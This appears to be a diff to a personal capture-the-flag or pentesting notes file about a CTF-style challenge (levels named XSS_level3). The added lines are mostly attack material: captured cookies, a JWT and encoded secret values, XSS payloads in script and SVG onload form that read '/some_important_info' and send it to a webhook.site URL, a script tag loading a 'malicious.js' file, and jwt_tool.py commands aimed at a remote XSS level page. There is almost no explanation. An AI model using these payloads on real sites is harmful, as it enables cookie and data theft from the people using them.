@@ -144,10 +144,30 @@ some_important_info
 ![image](https://github.com/user-attachments/assets/3092edf7-eacf-44ef-9b63-c685cb6f04ae)
 
 
+![image](https://github.com/user-attachments/assets/1db9e6f9-d01e-483d-92a3-c297622c1ce9)
+
+
+
 token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU; secret=MzB7WDU1X0MwMGsxM19Nb05TdDNyX30K; important_person_cookies=MzB7eHM1XzFkS193SDBfbjMzRF9pdH0K; token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU
 
 
 
+<script>fetch('/some_important_info').then(r=>r.text()).then(d=>fetch('https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f?flag='+d))</script>
 
 
+<SvG/oNloAdfetch('/some_important_info').then(r=>r.text()).then(d=>fetch('[https://your-server.com](https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f)?flag='+d))>
+
+<script src="file:/var/www/html/csp-pentesting/malicious.js"></script>
+
+	https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f
+
+python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test"
+
+python3 jwt_tool.py -t http://51.250.91.149/XSS/XSS_level3.php -rc "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU;anothercookie=test" -M pb-np
+
+
+![image](https://github.com/user-attachments/assets/6def24d6-e4ef-431c-9ea4-770bf8c84be5)
+
+
+![image](https://github.com/user-attachments/assets/a9f8020a-6fd6-4069-89a4-71a248193b3c)
 
